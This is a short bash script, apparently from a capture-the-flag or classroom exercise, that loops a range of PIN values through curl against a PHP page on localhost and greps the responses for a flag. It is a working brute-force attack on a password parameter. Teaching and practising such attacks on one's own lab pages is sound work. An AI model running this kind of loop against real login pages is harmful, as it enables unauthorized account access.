#!/bin/bash

# curl -s http://tsaitoh.net/~t-saitoh/recp/brute-force-pin4.php?PW=1234
# curl -s http://localhost/~ubuntu/recp/brute-force-pin4.php?PW=1234

for PW in `seq 8080 8090`
do
	echo $PW
	curl -s http://localhost/~ubuntu/recp/brute-force-pin4.php?PW=$PW \
	| grep FLAG
done
